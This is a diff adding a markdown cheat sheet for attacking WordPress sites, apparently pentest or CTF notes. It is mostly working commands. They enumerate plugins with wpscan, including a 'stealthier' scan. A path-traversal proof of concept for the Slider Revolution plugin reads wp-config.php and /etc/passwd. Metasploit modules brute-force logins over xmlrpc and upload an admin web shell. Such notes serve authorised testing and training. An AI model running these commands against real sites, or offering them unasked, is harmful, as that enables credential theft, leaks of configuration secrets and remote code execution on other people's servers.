@@ -1,0 +1,48 @@
+# Pentest Wordpress websites
+
+A suggested wordlist for bruteforce is fasttrack.txt but with season/years updated
+to current year + possibly custom words depending on the scenario
+if it is a ctf, I would add th first 500 of rockyou.txt
+
+# Enumerate and Scan through wpscan
+wpscan --url http://example.com --enumerate --api-token <TOKENHERE>
+;; or
+ docker run -it --rm wpscanteam/wpscan  --url http://10.10.111.55  --enumerate --plugins-detection aggressive --api-token <TOKENHERE>
+
+# Stealthier scan
+wpscan --stealthy --url myblog.com --enumerate --api-token <TOKENHERE>
+
+# Scan all Plugins and all Themes
+;; Many times wpscan does not list all the plugins, so be sure to perform 
+;; this step and go manually to search for vulnerabilities for the found plugins
+;; by keeping into account their version
+docker run -it --rm wpscanteam/wpscan  --url http://10.10.111.55  --enumerate ap,at --plugins-detection aggressive --api-token <TOKENHERE>
+;; useful to find vulnerabilities that are not found by wpscan
+;; especially as a second run of wpscan
+;; Once we find a plugin we generally find notes about the plugin 
+;; in the directory found within the readme.txt file
+
+# Test for CVE-2015-1579/CVE-2014-9734 
+# Reference: https://www.exploit-db.com/exploits/36554
+;; Wordpress Slider Revolution Responsive <= 4.1.4 suffers from Arbitrary File Download vulnerability
+;; PoC
+curl "http://localhost/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
+curl "http://localhost/wp-admin/admin-ajax.php?action=revslider_show_image&img=../../../../../../etc/passwd"
+
+# Bruteforce credentials through xmlrpc (metasploit)
+> use auxiliary/scanner/http/wordpress_xmlrpc_login
+> set USER_FILE /home/giuseppe/users.txt
+> set USER_AS_PASS true
+> set PASS_FILE /usr/share/wordlists/passwords/fasttrack.txt
+> set RHOSTS 10.10.111.55
+> set threads 100
+> show options
+
+# Upload a shell (must have administrative rights)
+;; first try to login with the credentials found
+;; check that we have administrative rights.
+use unix/webapp/wp_admin_shell_upload
+set USERNAME usass
+set PASSWORD password123
+set RHOSTS example.com
+run
